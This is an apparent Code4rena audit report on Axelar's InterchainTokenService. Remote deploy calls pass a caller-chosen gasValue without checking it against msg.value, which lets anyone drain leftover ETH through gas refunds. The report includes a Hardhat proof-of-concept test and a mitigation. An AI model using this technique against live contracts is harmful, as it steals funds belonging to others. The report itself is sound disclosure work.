# Lines of code

https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L328-L329
https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L370-L371
https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L425-L426


# Vulnerability details

## Description
When a user wants to do a cross chain deploy they can use any of the remote deploy calls on `InterchainTokenSerivce`. 
Using `deployAndRegisterRemoteStandardizedToken` as an example, however the same principle applies for `deployRemoteCustomTokenManager` and `deployRemoteCanonicalToken` as well:

To initiate a cross chain call, the caller can pay a gas fee to the `AxelarGasService`, this is done in `_callContract`:

https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L707-L724
```solidity
File: its/interchain-token-service/InterchainTokenService.sol

707:    function _callContract(
			// ... payload
710:        uint256 gasValue,
711:        address refundTo
712:    ) internal {
713:        string memory destinationAddress = remoteAddressValidator.getRemoteAddress(destinationChain);
714:        if (gasValue > 0) {
715:            gasService.payNativeGasForContractCall{ value: gasValue }( // <-- gas value sent
					// ... chain params
720:                refundTo // <-- refunded here
721:            );
722:        }
723:        gateway.callContract(destinationChain, destinationAddress, payload);
724:    }
```

This is called from the deploying calls where the user supplies a `gasValue` to be used:

https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L417-L429

https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L770-L800
```solidity
File: its/interchain-token-service/InterchainTokenService.sol

417:    function deployAndRegisterRemoteStandardizedToken(
			// ... params, can be anything
425:        uint256 gasValue // user supplies `gasValue`
426:    ) external payable notPaused {
427:        bytes32 tokenId = getCustomTokenId(msg.sender, salt);
428:        _deployRemoteStandardizedToken(tokenId, name, symbol, decimals, distributor, operator, destinationChain, gasValue);
429:    }

...

770:    function _deployRemoteStandardizedToken(
            // ... uninteresting params
778:        uint256 gasValue
779:    ) internal {
    	    // ... build payload

789:        _callContract(destinationChain, payload, gasValue, msg.sender); // <-- user supplied `gasValue` passed here together
                                                                            //     with `msg.sender` as receiver of the gas refund
            // ... emit event
800:    }
```

Here a user can supply any `gasValue` and this will be sent to `AxelarGasService` which supports the [unused gas to be refunded](https://docs.axelar.dev/dev/general-message-passing/gas-services/refund):
> The Executor Service automatically tracks the excess gas amount and refund it to the payer's wallet address by calling Refund in the Gas Service contract.

Thus a user can see that there is left over `eth` in the `InterchainTokenService` contract. Do a dummy cross chain deploy (which ever call consumes less gas) and supply all the available `eth` in `InterchainTokenService` as `gasValue` without sending any `msg.value`. The left over `eth` used for gas will then be refunded to the caller.

## Impact
Any `eth` (or other native gas token) in `InterchainTokenService` can be both used as gas for calls and claimed by overpaying remote deploy and receiving it as a gas refund.

## Proof of Concept
Test in `tokenService.js` using `RemoteStandardizedToken` but the same principle applies to all remote deploys:
```javascript
        it('remote deploy with eth left in InterchainTokenService',async () => {
            // assumes there is some left over eth in contract.
            // this can have been achieved by other users accidentally overpaying their deploys
            await wallet.sendTransaction({ to: service.address, value: gasValue*2});

            const tokenId = await service.getCustomTokenId(wallet.address, salt);
            const payload = defaultAbiCoder.encode(
                ['uint256', 'bytes32', 'string', 'string', 'uint8', 'bytes', 'bytes'],
                [SELECTOR_DEPLOY_AND_REGISTER_STANDARDIZED_TOKEN, tokenId, tokenName, tokenSymbol, tokenDecimals, distributor, operator],
            );

            await expect(
                service.deployAndRegisterRemoteStandardizedToken(
                    salt,
                    tokenName,
                    tokenSymbol,
                    tokenDecimals,
                    distributor,
                    operator,
                    destinationChain,
                    gasValue*2 // double gas value used for deploy, will be refunded to msg.sender
                    ))
                .to.emit(service, 'RemoteStandardizedTokenAndManagerDeploymentInitialized')
                .withArgs(tokenId, tokenName, tokenSymbol, tokenDecimals, distributor, operator, destinationChain, gasValue*2)
                .and.to.emit(gasService, 'NativeGasPaidForContractCall')
                .withArgs(service.address, destinationChain, service.address.toLowerCase(), keccak256(payload), gasValue*2, wallet.address)
                .and.to.emit(gateway, 'ContractCall')
                .withArgs(service.address, destinationChain, service.address.toLowerCase(), keccak256(payload), payload);
        });
```

## Tools Used
Manual audit

## Recommended Mitigation Steps
Consider validating that `gasValue==msg.value` for all remote deploy calls. This would also protect against users accidentally overpaying the gas fee. This is a trade-off against `multicall` since it will overpay if multiple deploys are done in the same call. The overpay will be refunded though.


